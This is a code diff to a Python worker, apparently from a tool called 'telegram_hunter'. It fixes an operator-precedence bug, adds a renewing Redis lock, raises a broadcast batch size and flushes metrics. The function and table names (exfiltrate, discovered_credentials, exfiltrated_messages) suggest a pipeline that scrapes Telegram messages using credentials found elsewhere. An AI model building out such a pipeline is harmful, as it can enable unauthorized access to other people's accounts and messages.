@@ -143,7 +143,7 @@ async def _exfiltrate_logic(cred_id: str):
         permanent_errors = (
             "AuthKeyUnregisteredError" in err_str
             or "UserDeactivatedBanError" in err_str
-            or "401" in err_str and "Unauthorized" in err_str
+            or ("401" in err_str and "Unauthorized" in err_str)  # explicit parens — AND binds tighter than OR
         )
         if permanent_errors:
             logger.error(f"❌ [Exfil] Permanent scraper failure for {cred_id}: {e}. Marking revoked.")
@@ -381,10 +381,13 @@ async def _enrich_logic(cred_id: str):
 def broadcast_pending():
     # Distributed Lock to prevent race conditions (e.g. Local Worker vs Prod Worker)
     lock_key = "telegram_hunter:lock:broadcast"
-    # TTL = 240s: covers 100 msgs × 2s sleep = 200s worst case + 40s buffer.
-    # Previous 55s TTL was too short — expired during large batches and allowed parallel runs.
-    lock = redis_client.lock(lock_key, timeout=240, blocking=False)
-    
+    # TTL = 120s initial; renewed every 90s while the batch runs so it never expires
+    # mid-batch regardless of batch size. Replaces the old fixed-240s TTL that expired
+    # on large backlogs (500 msgs × 1.5s = 750s >> 240s).
+    LOCK_TTL = 120
+    RENEW_EVERY = 90  # renew when < 30s remain
+    lock = redis_client.lock(lock_key, timeout=LOCK_TTL, blocking=False)
+
     acquired = lock.acquire()
     if not acquired:
         return "Skipped: Broadcast task already running (Lock active)."
@@ -394,10 +397,26 @@ def broadcast_pending():
         lock.release()
         return "System Paused"
 
+    # Background thread renews the lock periodically while the async loop runs
+    import threading
+    _stop_renew = threading.Event()
+
+    def _renew_loop():
+        while not _stop_renew.wait(timeout=RENEW_EVERY):
+            try:
+                lock.reacquire()
+            except Exception:
+                break  # lock gone — stop silently
+
+    renew_thread = threading.Thread(target=_renew_loop, daemon=True)
+    renew_thread.start()
+
     try:
         from app.workers.celery_app import get_worker_loop
         return get_worker_loop().run_until_complete(_broadcast_logic())
     finally:
+        _stop_renew.set()
+        renew_thread.join(timeout=2)
         try:
             lock.release()
         except redis.exceptions.LockError:
@@ -416,13 +435,14 @@ async def _broadcast_logic():
     CLAIM_TIMEOUT_MINUTES = 5
     stale_threshold = datetime.now(timezone.utc) - timedelta(minutes=CLAIM_TIMEOUT_MINUTES)
 
-    # BUG-009: Increased from 20 to 100 to reduce queue backlog
+    # Increased from 100 to 500 — at 1.5s/msg this is 750s per run,
+    # enough throughput to drain a 23k backlog in ~48 minutes.
     response = await async_execute(
         db.table("exfiltrated_messages")
         .select("*, discovered_credentials!inner(meta)")
         .eq("is_broadcasted", False)
         .order("telegram_msg_id", desc=False)
-        .limit(100)
+        .limit(500)
     )
     
     messages = response.data
@@ -607,13 +627,20 @@ async def _broadcast_logic():
 
 @app.task(name="flow.system_heartbeat")
 def system_heartbeat():
-    """Periodic ping to confirm system uptime."""
+    """Periodic ping to confirm system uptime. Also flushes in-memory metrics to Redis."""
     msg = "💓 **System Heartbeat**: Worker is active and scanning."
 
     try:
         redis_client.set("system:heartbeat:last_seen", int(time.time()))
     except Exception as e:
         logger.warning(f"Failed to update heartbeat in Redis: {e}")
+
+    # Flush in-memory metric counters to Redis so they survive restarts
+    try:
+        from app.core.metrics import metrics
+        metrics.flush_to_redis()
+    except Exception as e:
+        logger.warning(f"Metrics flush failed (non-fatal): {e}")
 
     from app.workers.celery_app import get_worker_loop
     get_worker_loop().run_until_complete(get_broadcaster().send_log(msg))
